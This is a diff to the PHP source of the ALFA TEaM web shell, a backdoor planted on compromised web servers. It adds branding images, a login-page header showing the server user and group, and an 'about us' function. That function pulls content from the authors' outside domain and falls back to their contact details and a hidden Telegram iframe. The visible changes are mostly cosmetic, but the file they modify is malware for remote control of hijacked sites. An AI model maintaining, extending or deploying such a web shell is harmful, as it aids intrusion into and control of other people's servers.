@@ -527,6 +527,7 @@ body{background: black;}
 #loginbox td { border-radius:5px; font-size:11px; }
 </style>
 <title>.: Rebirth Tesla :.</title><center>
+<center><img style="border-radius:100px;" width="500" height="250" alt="alfa team 2012" draggable="false" src="https://i.ibb.co/BgFwR7g/20200704-165720.jpg" /></center>
 <div id=loginbox><p><font face="verdana,arial" size=-1>
 <center><table cellpadding=\'2\' cellspacing=\'0\' border=\'0\' id=\'ap_table\'>
 <tr><td bgcolor="green"><table cellpadding=\'0\' cellspacing=\'0\' border=\'0\' width=\'100%\'><tr><td bgcolor="green" align=center style="padding:2;padding-bottom:4"><b><font color="white" size=-1 color="white" face="verdana,arial"><b>~ ALFA TEaM Shell-v'.__ALFA_VERSION__.'-'.__ALFA_CODE_NAME__.' ~</b></font></th></tr>
@@ -1102,6 +1103,7 @@ echo '<input type="hidden" name="charset">
 <tr>
 <td><span class="header_vars">User:</span></td>
 <td><span class="header_values" id="header_userid">'. $uid . ' [ ' . $user . ' ] </span><span class="header_vars"> Group: </span><span class="header_values" id="header_groupid">' . $gid . ' [ ' . $group . ' ]</span> </td>
+<td width="12%" rowspan="8"><img style="border-radius:100px;" width="300" height="170" alt="alfa team 2012" draggable="false" src="https://i.ibb.co/BgFwR7g/20200704-165720.jpg" /></td>
 </tr>
 <tr>
 <td><span class="header_vars">PHP:</span></td>
@@ -1543,6 +1545,30 @@ if($_POST['alfa2']=='>>'){
 }
 }
 echo('</div>');
+alfafooter();
+}
+function alfaaboutus(){
+alfahead();
+echo '<div class="header">';
+$news = new AlfaCURL();
+$about_us = $news->Send("http://solevisible.com/aboutus.php");
+if(empty($about_us)){
+$about_us = "<pre><center><img src='https://i.ibb.co/BgFwR7g/20200704-165720.jpg'><br>
+<b><font size='+3' color='#00A220'>&#9774; ~ PEACE ~ &#9774;</font><br><b>
+<font color='#00A220'>Shell Coded By Sole Sad & Invisible (ALFA TEaM)</font><br>
+<font color='#00A220'>Contact : solevisible@gmail.com</font><br>
+<font color='#00A220'>Telegram Channel: @solevisible</font><br>
+<font color='#FFFFFF'>Skype : ehsan.invisible</font><br>
+<font color='#FFFFFF'>Skype : sole.sad</font><br>
+<font color='#FF0000'>Persian Gulf For Ever</font><br>
+<font color='#FF0000'>Iranian Programmers</font><br>
+<font color='#FF0000'>############</font><br>
+</center></pre><iframe src='tg://resolve?domain=solevisible' frameborder='0' width='0' height='0'></iframe>";
+}
+echo __pre().$about_us;
+echo('</div>');
+alfafooter();
+}
 function alfacoldumper(){
 alfahead();
 echo('<div class="header">');
